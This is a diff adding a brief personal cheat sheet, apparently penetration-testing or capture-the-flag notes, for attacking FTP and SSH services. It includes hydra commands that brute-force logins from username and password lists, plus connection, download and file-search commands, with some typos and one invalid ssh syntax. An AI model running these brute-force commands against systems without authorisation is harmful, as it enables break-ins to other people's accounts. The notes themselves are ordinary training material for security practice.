@@ -1,0 +1,9 @@
+Ftp
+hydra -L user.txt -P pass.txt ftp://ip
+to connect CMD: ftp ip
+CMD: get file name (to download the file to view)
+find / -type f -name 'filename.txt' 2>/dev/null
+
+SSH
+hydra -L uesr.txt -P pass.txt IP ssh
+ssh usernmae@ip (or) ssh username@ip:22 (or) ssh usernmae@ip -p port
